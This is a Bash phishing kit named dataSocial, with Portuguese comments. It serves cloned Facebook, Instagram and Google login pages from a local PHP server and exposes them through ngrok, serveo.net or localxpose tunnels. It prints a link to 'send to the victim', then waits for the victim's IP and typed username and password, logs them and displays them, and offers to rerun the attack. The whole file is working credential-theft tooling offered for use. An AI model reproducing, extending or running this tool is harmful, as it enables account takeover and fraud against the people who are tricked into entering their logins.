#!/usr/bin/env bash
# dataSocial - Pesca dados de redes sociais através de páginas sociais modificadas usando a técnica phishing de engenharia social
#
# Site		: https://programadorboard.epizy.com/autor
# Autor		: Oliver Silva <programadorboard@gmail.com>
# Manutênção 	: Oliver Silva <programadorboard@gmail.com>
#
# -------------------------------
# Este programa captura dados de redes sociais através de páginas sociais modificadas utilizando a técnica phishing de engenharia social.
#
# Exemplo:
#
# $ ./dataSocial --service facebook --tunnel ssh --listen
#
# [+] Dados para enviar a vítima:
# [+] Localhost: localhost:5555
# [+] Ngrok localhost: http://localhost:5555
# [+] Ngrok URL: https://00c8-191-96-225-179.sa.ngrok.io
# [-] Nova conexão aberta: 127.0.0.1
# [-] Credenciais capturadas:
# [+] Seu log está em logs/dataSocial.txt
# [-] Usuário: example@server.com
# [-] Senha: teste
# [?] Digite 'ctr+C' OU 'quit' para cancelar OU 'rerun' para realizar novamente este ataque
# quit
#
# [×] Programa interrompido
#
# Histórico:
#
# v0.1 2022-11-28, Oliver Silva;
#     Adicionado suporte para facebook e instagram
# v0.2 2023-01-05, Oliver Silva:
#     Adicionado o comando JQ no lugar do GREP
# v0.3 2023-01-07, Oliver Silva:
#     Adicionado instalador de requisitos caso necessário
# v0.4 2023-01-08, Oliver Silva:
#     Adicionado o loop while no lugar da recursão infinita evitando o bug 'Segmentation fault'
# v0.5 2023-03-19, Oliver Silva:
#     Adicionado suporte a repetição do ataque
# v0.6 2023-03-31, Oliver Silva:
#     Adicionado suporte ao modo interativo
# v0.7 2023-04-27, Oliver Silva:
#     Adicionado algumas regras no prompt bloqueando algumas teclas de atalhos
# v0.8 2023-08-31, Oliver Silva:
#     Adicionado mais uma tela google e refatoração
# v0.9 2023-9-15, Oliver Silva:
#     Adicionado um proxy reverso localxspose
# v1.0 2023-9-16, Oliver Silva:
#     Adicionada opção de adicionar token de acesso de tunels
#
# Licença: MIT License
#
# Versão 0.1: Gera páginas somente facebook e instagram
# Versão 0.2: Troca do GREP pelo JQ pra formatação dos dados
# Versão 0.3: Instalador de requisitos
# Versão 0.4: Bug 'Segmentation fault' resolvido o qual foi causado pela recursão infinita
# Versão 0.5: Repetição do ataque caso precise
# Versão 0.6: Modo interativo adicionado
# Versão 0.7: Tratamento do prompt, bloqueio das teclas de atalho
# Versão 0.8: Página do gooogle atualizada, refatoração.
# Versão 0.9: Novo tunnel adicionado, refatoração.
# Versão 1.0: Nova opção '--add-token' adicionada para vincular contas através do token de acesso.
#


### trap

trap interruptTwo SIGINT SIGTSTP


### VARIÁVEIS ###

### Localhost e port

host="localhost"
port="5555"

args=$@

### Chaves de ativação de funcionalidade

tokenAccessKey=0
serviceKey=0
listenKey=0
tunnelKey=0


### FUNÇÔES ###


### Checa termux-chroot

checkProot() {
    if [ ! -d /etc/apt ] ; then
	echo -e "\n\e[0mRun the program in proot or another type.\nExample : 'termux-chroot ./datasocial.sh $args'\e[0m."
	interruptTwo
    fi
}


### Checa serviço

checkService() {
    serviceSelected=$1

    if [ -d ./websites/$serviceSelected ] ; then
        echo -e "\n\e[0m\e[31;1mService => $serviceSelected\e[0m"
    else
        echo -e "\n\e[0m\e[33;1mInvalid service => $serviceSelected\e[0m"
	unset serviceSelected
    fi
}


### Checa tunnel

checkTunnel() {
    tunnelSelected=$1
    serviceSelected=$2

    # Checa se o serviço foi selecionado antes do 'tunnel'
    if [ -n "$serviceSelected" ] ; then

        if [ -f ./tunnels/$tunnelSelected ] ; then
      	    echo -e "\n\e[0m\e[31;1mTunnel => $tunnelSelected\e[0m"
        else
	    echo -e "\n\e[0m\e[33;1mInvalid tunnel => $tunnelSelected\e[0m"
	    unset tunnelSelected
        fi
    else
	echo -e "\n\e[0m\e[33;1m[!] Select a service before defining the tunnel\e[0m"
	unset tunnelSelected
    fi
}


### Interrompe processos e apaga arquivos

interrupt() {
    echo -e "\n\e[32m[\e[33;1m×\e[32m] \e[31;1mInterrupted program\e[0m"
    killProcess
    removeFiles
    stty -echoctl
}

### Interrompe processo, apaga arquivos e sai do programa

interruptTwo() {
    interrupt
    exit 1
}


### Apaga arquivos

removeFiles() {
    [ -d ./www ] && rm ./www -rf
}


### Copia arquivos

copyFiles() {
    service=$serviceSelected

    [ ! -d ./www ] && mkdir ./www

    if [ -d websites/${service} ] ; then
	cp -rf websites/${service}/* ./www

    else
	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mThis service is not available\e[0m"
    fi
}


### Mata todos os processos

killProcess() {
    [ $(ps -e | grep -Eo "php") ] && pkill php
    [ $(ps -e | grep -Eo "ngrok") ] && pkill ngrok
    [ $(ps -e | grep -Eo "ssh") ] && pkill ssh
    [ $(ps -e | grep -Eo "loclx") ] && pkill loclx
}


### Extrai arquivos

extract() {
    tunnelName="$1"
    arch="$2"

    if [ "$tunnelName" == "ngrok" ] ; then
	tar -xvzf ngrok-v3-stable-linux-${arch}.tgz -C tunnels/ > /dev/null

    elif [ "$tunnelName" == "loclx" ] ; then
	unzip loclx-linux-${arch}.zip -d tunnels/ > /dev/null

    fi
}


### Instala uma ferramenta de tunnel se não existir

installTunnel() {
    case "$(dpkg --print-architecture)" in
	aarch64) arch="arm64";;
	armhf | arm) arch="arm";;
	amd64) arch="amd64";;
	x86_84) arch="amd64";;
	i*86) arch="i386";;
	i386) arch="i386";;
    *)
	echo "[!] Invalid architecture"
	exit 1
    esac


    tunnelName="$1"
    tunnelIndex="$2"

    tunnelsLinks=(
	"https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-${arch}.tgz"
	"https://api.localxpose.io/api/v2/downloads/loclx-linux-${arch}.zip"
    )

    if [ ! -f ./tunnels/$tunnelName ] ; then
	printf "\r\e[33;1m[*] Installing $tunnelName...\e[0m"
	curl -LO ${tunnelsLinks[$tunnelIndex]} > /dev/null 2>&1 &
	
	while [ -n "$(ps -e | grep -Eo 'curl')" ] ; do
	    printf "\r\e[33;1m[*] Installing $tunnelName..."
	    
    	done
	printf "\r\e[33;1m[+] Installing $tunnelName...\e[32;1mOK\e[0m\n"
	
	while [ ! -f ./tunnels/$tunnelName ] ; do
	    printf "\r\e[33;1m[*] Extracting $tunnelName...\e[0m"
	    extract $tunnelName $arch
	done
	printf "\r\e[33;1m[+] Extracting $tunnelName...\e[32;1mOK\e[0m\n"
	rm *.zip *.tgz > /dev/null 2>&1
    fi

}


### Ativa servidor localmente

listenServer() {
    php -S ${host}:${port} -t ./www &> wait.log &
    sleep 3
    
}


### Grupo de funçôes

groupFunction() {
    removeFiles
    copyFiles
    killProcess
}


### Aguarde

waitMessage() {
    list="$1"

    echo -e "\n"
    for i in $(seq $list) ; do
        printf "\r[*] Wait, please...$i/$list"
	sleep 1
    done
    echo -e "\n\n"
}


### Adiciona token de acesso 

addTokenAccess() {
    tokenName="$tokenAccess"

    if [ ! -f ./tunnels/$tokenName ] ; then
	echo -e "\e[0m[\033[31;1m!\e[0m] Tunnel does not exist $tokenName to add the access token"
	exit

    elif [ "$tokenName" == "ngrok" ] ; then
	echo -e "\e[0m1 register at : \e[32;1mhttps://dashboard.ngrok.com/signup\e[0m"
	echo -e "\e[0m2 Access your account at : \e[32;1mhttps://dashboard.ngrok.com/login\e[0m"
	echo -e "\e[0m3 Copy the access token : \e[32;1mhttps://dashboard.ngrok.com/get-started/your-authtoken\e[0m"
	echo -e "\nToken Access" ; read token
	
	[ -z "$token" ] && addTokenAccess
	[ -n "$token" ] && ./tunnels/ngrok config add-authtoken $token
	exit

    elif [ "$tokenName" == "loclx" ] ; then
	echo -e "\e[0m1 register at : \e[32;1mhttps://localxpose.io/signup\e[0m"
	echo -e "\e[0m2 Access your account at : \e[32;1mhttps://localxpose.io/login\e[0m"
	echo -e "\e[0m3 Copy the access token : \e[32;1mhttps://localxpose.io/dashboard/access\e[0m"

	./tunnels/loclx account login
    fi
}


### tunnels

listen() {
    case "$tunnelSelected" in
	"ngrok")
	    groupFunction
	    installTunnel "ngrok" "0"
	    listenServer
	    ./tunnels/ngrok http $port --log=stdout &> wait.log &
            waitMessage 3
	    showLink "ngrok"
	    
	    ;;

        "ssh")
	    groupFunction
	    listenServer
	    ./tunnels/ssh -tt -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R $service:$port:$host:$port serveo.net &> wait.log &
	    waitMessage 2
	    showLink "ssh"
	    ;;

	"loclx")
	    groupFunction
	    installTunnel "loclx" "1"
	    listenServer
	    ./tunnels/loclx tunnel --raw-mode http --https-redirect --to ${host}:${port} &> wait.log &
	    waitMessage 10
	    showLink "loclx"
	    ;;

	*)
	    if [ -z "$tunnelSelected" ] ; then
		groupFunction
		listenServer
		waitMessage 3
		showLink "localhost"
	    fi
	    
	    echo -e "\e[0m[\e[33;1m!\e[0m] Running without tunnel\e[0m"
	    ;;
    esac
}


#### Mostra link

showLink() {
    checkReq && banner
    tunnel="$1"
    
    echo -e "\e[0m[!] Send to the victim:\e[0m"

    if [ "$tunnel" == "localhost" ] ; then
	link="$(grep -o 'http://[-0-9a-z:]*' wait.log)"

	if [ -n "$link" ] ; then
	
	    echo -e "\e[0m[+] Localhost: \e[33;1m$link\e[0m"
	else
	    echo -e "\e[31;1m$(grep -o "Error:.*" wait.log)\e[0m"
	    
	fi

    elif [ "$tunnel" == "ngrok" ] ; then
	link="$(grep -o 'https://[-0-9a-z.]*' wait.log)"

	if [ -n "$link" ] ; then
	
	    echo -e "\e[0m[+] Ngrok: \e[33;1m$link\e[0m"
	else
	    echo -e "\e[31;1m$(grep -o "Error:.*" wait.log)\e[0m"
	    
	fi

    elif [ "$tunnel" == "ssh" ] ; then
	echo -e "\e[0m[!] SSH: \e[33;1mserveo.net:$port\e[0m"

    elif [ "$tunnel" == "loclx" ] ; then
	link="$(grep -o '[-0-9a-z.]*loclx.io' wait.log)"

	if [ -n "$link" ] ; then
	
	    echo -e "\e[0m[+] Localxpose: \e[33;1m$link\e[0m"
	else
	    echo -e "\e[31;1m$(grep -o "Error:.*" wait.log)\e[0m" 
	    
	fi      
	
    fi
}



### Mostra o ip

get_ip() {
    while [ ! -f ./www/ip.txt ] ; do
	printf "\r\e[0m[*] Listening connection...\e[0m"
    done

    ip=$(cat ./www/ip.txt | grep -Eo ":.*" | tr -d \ :)
    printf "\r\e[0m[+] New open connection: \e[33;1m$ip\e[0m\n"

}


### Mostra os dados de acesso

get_data() {
    while [ ! -f ./www/src/dados.txt ] ; do 
	printf "\r\e[0m[*] Waiting for credentials...\e[0m"
    done

    [ ! -d ./logs ] && mkdir logs

    cat ./www/src/dados.txt > ./logs/dataSocial.txt
    printf "\r\e[0m[+] Captured credentials:     \e[0m\n"
    printf "\r\e[0m[+] Your log is in \e[32mlogs/dataSocial.txt\e[0m\n"

    usuario=$(cat ./www/src/dados.txt | grep -Eo "Usuário:.*" | grep -Eo ":.*" | tr -d \ :)
    senha=$(cat ./www/src/dados.txt | grep -Eo "Senha:.*" | grep -Eo ":.*" | tr -d \ :)

    echo -e "\e[0m[+] Username: \e[32m$usuario\e[0m"
    echo -e "\e[0m[+] Password: \e[32m$senha\e[0m"
}



### Repetir o teste

control() {
    echo -e "\e[0mType 'ctr+C' OR 'quit' to cancel OR 'rerun' to rerun this attack\e[0m" ; read
	
    if [ "$REPLY" == "rerun" ] ; then
	rerun

    elif [ "$REPLY" == "quit" ] ; then
        interruptTwo

    else
	control
    fi
}



### Mostra o ip, dados de acesso e pergunta se repete o teste

getDataCaptured() {
    get_ip
    get_data
    control
}


### Banner

banner() {
	local w="\e[0m"    # Color white
	local b="\e[34;1m" # Color blue
	local f="\e[34;3m" # Color blue font italic

	echo -e "${b}
	        '  
              '   '  TIOOLIVER | ${f}t.me/tiooliver_sh
            '       '   ${f}youtube.com/@tioolive ${w}${b}- BRAZIL
        . ' .    '    '                       '
     ' 		    '	                   '   '
  █▀▄ ▄▀█ ▀█▀ ▄▀█   █▀ █▀█ █▀▀ █ ▄▀█ █░░
  █▄▀ █▀█ ░█░ █▀█   ▄█ █▄█ █▄▄ █ █▀█ █▄▄ 
  .			     ..'.    ' .
    '  .    		   .     '       '
          ' .  .  .  .  . '.    .'         '  '
	     '         '    '. '              .
	       '       '      '
	         ' .  '   Site: ${f}http://tiooliver.rf.gd 
${w}"
}


### Ajuda

helper() {
    space="  "
    echo -e "Uso: $(basename "$0") [OPÇÔES]\n$space-h, --help\t\tShow  this help screen and exit\n$space-v, --version\t\tShows the current version of the program\n$space--add-token TOKEN\tAdd access token\n$space-S, --services\tShow all services\n$space-T, --tunnels\t\tShow all tunnels\n$space-s, --service\t\tUse a service\n$space-l, --listenServer\tEnable listenning on localhost\n$space-t, --tunnel\t\tDefines a tunnel\n$space-i, \n$space--interactive\t\tStart the program in interactive mode\n\nExamples:\n\nLocalhost:\n$space${0} -s facebook -l\n\nTunnel:\n$space${0} -s facebook -l -t ngrok"
    exit 0
}

### Versão

version() {
    echo -ne "$(basename "$0")"
    grep "^# Versão" "$0" | tail -1 | cut -d ":" -f 1 | tr -d \# | tr A-Z a-z
}


### Percorre a uma lista


list() {
    array="$1"
    count=1

    echo -e "\n\e[0mAll $2\e[0m"

    for index in $array/* ; do
	index=$(basename "$index")
	echo -e "\e[0m$count => \e[0m\e[32;2m$index\e[0m"
	count=$((count +1))
    done
}


### Checa pacotes necessários


checkReq() {
    listReq=("ssh" "tar" "php" "jq" "curl" "toilet" "figlet" "unzip" "proot")

    [ -d $PREFIX/bin ] && dir=$PREFIX/bin # Termux
    [ -d /usr/bin ] && dir=/usr/bin 	  # Proot, Chroot or others

    for package in ${listReq[*]} ; do
	if [ "$package" == "openssh" ] ; then
	    package="ssh"

	fi

	if [ ! -f $dir/$package ] ; then
	    echo -e "\e[0mPackage required not found => \e[0m\e[33;2m$package\e[0m"
	    echo -e "\e[0mTry run => \e[0m\e[32;2mbash ./install.sh\e[0m"
	    exit 1
	fi
    done
}


### Repetir o teste


rerun() {
    echo -e "\e[0mRun that attack again? [y/n] : \e[0m" ; read

    if [ -z "$REPLY" ] ; then
	rerun

    elif [ -n "$REPLY" -a "$REPLY" == "y" -o "$REPLY" == "Y" ] ; then
	interrupt > /dev/null && ./datasocial.sh $args

    elif [ -n "$REPLY" -a "$REPLY" == "n" -o "$REPLY" == "N" ] ; then
	interrupt

    else
	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mInvalid answer, try '\e[33;1my\e[31;1m' or '\e[33;1mn\e[31;1m'\e[0m\n"
	rerun
    fi
}


### Uso do Modo interativo


usage_i() {
    echo -e "\n\n\t\e[0mCommand\t\tDescription\n\t-------\t\t-----------\n\t?\t\tHelp menu\n\tquit\t\tStop this program\n\tshow <?>\tIt shows services, tunnels, default options. Replace <?> with one of these 3 commands\n\tuse <?>\t\tUse services and etc. Replace <?> with one of these commands\n\tset <?>\t\tDefine tunnels and etc. Replace <?> with one of these commands\n\trun\t\trun the setup\n\n"
}


### Opçôes do modo interativo


options_i() {
    echo -e "\n\e[0mModule options (service/${1:-No service}):\n\n\tName\tCurrent Setting\tRequire\tDescription\n\t----\t---------------\t-------\t-----------\n\tTunnel\t[${2:-No tunnel}]\t\tno\tAllow the tunnel\n\n"
}


### Menu modo interativo


menu() {

    count=0
    commands=()

    scape=$(printf '\u1b')
    cmd="\e[0m\e[31;1mDs\e[36;3m>\e[0m\e[34m"

    while [[ true ]] ; do

	echo -ne "\r$cmd $comm"

	IFS= read -rsn1 mode

	if [[ $mode == $scape ]] ; then
	    IFS= read -rsn2 mode

	    case $mode in
		"[A")
		    if [[ ${#commands[*]} -ge 1 ]] ; then
	
			index=$[ $count -1 ]
			comm=${commands[$index]}
		    fi
		    ;;
		"[B")
			unset comm
			printf "\r                                                 "
		    ;;
		*)
            esac

	elif [[ $mode == $'\x7f' ]] ; then
	    if [[ -n $comm ]] ; then

		comm=${comm%?}
		printf "\b \b"
		
	    fi
     
        elif [[ $mode == $'\0A' ]] ; then
	    if [[ -n "$comm" ]] ; then

		# quit, exit
		if [[ "$comm" == "quit" ]] || 
		   [[ "$comm" == "QUIT" ]] || 
		   [[ "$comm" == "exit" ]] || 
		   [[ "$comm" == "EXIT" ]] ; then
		
		    interrupt && exit 0

		# help, ?
		elif [[ "$comm" == "help" ]] || 
		     [[ "$comm" == "HELP" ]] || 
		     [[ "$comm" == "?" ]] ; then
	      	    commands[$count]=$comm
		    usage_i

		# show
		elif [[ "${comm:0:4}" == "show" ]] ; then
		    commands[$count]=$comm
		    if [[ -n "${comm:5}" ]] ; then

			if [[ "${comm:5:8}" == "services" ]] ; then
      	    	            list ./websites/ "services"
			    commands[$count]=$comm

			elif [[ "${comm:5:7}" == "tunnels" ]] ; then
			    list ./tunnels "tunnels"
			    commands[$count]=$comm

			elif [[ "${comm:5:7}" == "options" ]] ; then
			    commands[$count]=$comm

			    options_i "$serviceSelected" "$tunnelSelected"

			else

			    echo -e "\n\e[0m\e[33;1mCommands = services - tunnels - options ?\e[0m"

			fi

		    else
			echo -e "\n\e[0m\e[33;1mCommands = services - tunnels - options ?\e[0m"

		    fi

		# use
		elif [[ "${comm:0:3}" == "use" ]] ; then

		    commands[$count]=$comm

		    if [[ -n "${comm:4}" ]] ; then

		        if [[ "${comm:4:7}" == "service" ]] ; then
			    commands[$count]=$comm

			    if [[ -n "${comm:12}" ]] ; then
				
				commands[$count]=$comm
			        checkService "${comm:12}"
				
		            else
				echo -e "\n\e[0m\e[33;1mCommands = show services - ?\e[0m"

			    fi

			else
			    echo -e "\n\e[0m\e[33;1mCommands = service - ?\e[0m"

		        fi

		    else
			echo -e "\n\e[0m\e[33;1mCommands = service - ?\e[0m"

		    fi

		# set
		elif [[ "${comm:0:3}" == "set" ]] ; then

		    commands[$count]=$comm

		    if [[ "${comm:4:6}" == "tunnel" ]] ; then
			
			if [[ -n "${comm:11}" ]] ; then

			    commands[$count]=$comm
			    checkTunnel "${comm:11}" "$serviceSelected"

			else
			    echo -e "\n\e[0m\e[33;1mCommands = ngrok - ssh - show tunnels - ?\e[0m"
			
			fi

		    else
			echo -e "\n\e[0m\e[33;1mCommands = tunnel - help\e[0m"

		    fi

		# run, execute, exploit
		elif [[ "${comm:0:3}" == "run" ]] || 
		     [[ "${comm:0:7}" == "execute" ]] || 
		     [[ "${comm:0:7}" == "exploit" ]] ; then
		    commands[$count]=$comm

		    if [[ -n "$serviceSelected" ]] && 
		       [[ -z "$tunnelSelected" ]] then
			echo -e "\n\e[0mRunning the setup locally\e[0m..."
			args="--listenServer --service $serviceSelected"
			listen && getDataCaptured

		    elif [[ -n "$serviceSelected" ]] && 
			[[ -n "$tunnelSelected" ]] ; then
			echo -e "\n\e[0mRunning the configuration with tunnel\e[0m..."
			args="--listenServer --service $serviceSelected --tunnel $tunnelSelected"
			listen && getDataCaptured

		    else
			echo -e "\n\e[0m\e[33;1m[!] No settings defined\e[0m"

		    fi

		else
		    echo -e "\n\e[0m\e[33;1mCommands = ? - help\e[0m"
		fi

		unset comm
		count=$[ $count +1 ]

	    else
		echo -e "\n\e[0m\e[33;1mError, try? or help for more help!\e[0m"
	
	    fi

        else
	    comm+=$mode 
	fi
    done
    interrupt
    exit 0
}


### Total de serviços

total_services() {
    count=0
    for index in ./websites/*; do
	count=$((count +1)); 
    done
    
    echo $count
}


### Banner modo interativo


banner_two() {

    version=$(grep "^# Versão" "$0" | tail -1 | cut -d ":" -f 1 | tr -d \# | tr -d " a-zãV")
    dateUpdate=$(grep "^# v.*" datasocial.sh | cut -d , -f 1 | tr -d \# | tr -d "a-z." | cut -c5-15 | tail -1)

    echo -e "\n\n"
    toilet -f slant DataSocial --metal

    echo -e "\t\t--=[DataSocial Phishing\n\t+---**---==[Version :\e[31m$version\e[0m\n\t+---**---==[Codename :\e[31mLiving is not for the weak\e[0m\n\t+---**---==[Services : \e[32;2m$(total_services)\e[0m\n\t\t--=[Update Date : [\e[31m$dateUpdate\e[0m]"
    echo -e "\n\n"
}


### Modo interativo

interactiveMode() {
    checkProot
    checkReq
    banner_two
    menu
}


### Verificação

if [ -z "$1" ] ; then
    banner
    echo -e "\e[0m[\e[31;1m!\e[0m] \e[0mError, try -h,--help for more help\e[0m"
    exit 0
fi


### Tratamento de opçôes

while [ -n "$1" ] ; do
    case "$1" in
	-h | --help) helper;;
	
	-v | --version) version && exit 0;;

	--add-token)
	    shift
	    
	    if [ -z "$1" ] ; then
		echo -e "\e[0m[\e[31;1m!\e[0m] Specify the tunnel name to add the access token\e[0m"
		exit 1
	    fi

	    tokenAccess="$1"
	    tokenAccessKey=1
	    ;;
	
	-S | --services)
	    list ./websites "services" && exit 0;;
	
	-T | --tunnels)
	    list ./tunnels "tunnels" && exit 0;;
	
	-s | --service)
	    shift

	    if [ -z "$1" ] ; then
		echo -e "\e[0m[\e[31;1m!\e[0m] \e[0mSpecify the service\e[0m"
		exit 1
	    fi

	    if [ ! -d  ./websites/$1 ] ; then
		echo -e "\e[0m[\e[31;1m!\e[0m] \e[0mInvalid service $1\e[0m"
		exit
	    fi

	    serviceKey=1
	    serviceSelected="$1";;

	-l | --listenServer)
	    listenKey=1;;
	
	-t | --tunnel)
	    shift

	    if [ -z "$1" ] ; then
		echo -e "\e[0m[\e[31;1m!\e[0m] Specify the tunnel\e[0m"
		exit 1
	    fi

	    if [ ! -f  ./tunnels/$1 ] ; then
		echo -e "\e[0m[\e[31;1m!\e[0m] \e[0mInvalid tunnel $1\e[0m"
		exit
	    fi
	    
	    tunnelKey=1
	    tunnelSelected="$1"
	
	    ;;
	
        -i | --interactive)
	    interactiveMode;;

	*)
	    echo -e "\e[0m[\e[31;1m!\e[0m] Invalid option: $1\e[0m" && exit 1;;
    esac
    shift
done


### Execução


if [ "$tokenAccessKey" == 1 ] ; then
    checkReq && checkProot && addTokenAccess
    
elif [ "$serviceKey" == 1 -a "$listenKey" == 1 -a "$tunnelKey" == 0 ] ; then
    checkReq && checkProot && listen && getDataCaptured

elif [ "$serviceKey" == 1 -a "$listenKey" == 1 -a "$tunnelKey" == 1 ] ; then
    checkReq && checkProot && listen && getDataCaptured

else
    echo -e "\e[0m[\e[31;1m!\e[0m] \e[0mError processing command, try: -h,--help for more details\e[0m"
    exit 1
fi
